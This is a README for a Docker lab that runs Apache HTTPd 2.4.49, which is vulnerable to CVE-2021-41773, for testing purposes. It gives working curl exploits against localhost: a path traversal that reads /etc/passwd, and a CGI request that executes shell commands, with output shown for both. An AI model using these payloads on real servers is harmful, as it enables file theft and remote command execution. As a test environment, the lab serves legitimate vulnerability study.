CVE-2021-41773 Playground
===

This is a small Docker recipe for setting up a Debian bookworm based container with an instance of the Apache HTTPd (2.4.49) that is vulnerable to [CVE-2021-41773](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-41773).

CGI has been explicitly enabled so it can be used to test/verify Local file Disclosure behavior as well as Remote Command Execution behavior.

Usage
===
```
$ docker-compose build && docker-compose-up
```

Local file disclosure
===
```
$ curl -s --path-as-is "http://localhost:8080/icons/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd"
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
```

Remote Code Execution
===
```
$ curl -s --path-as-is -d 'echo Content-Type: text/plain; echo; id' "http://localhost:8080/cgi-bin/.%2e/%2e%2e/%2e%2e/bin/sh"
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```
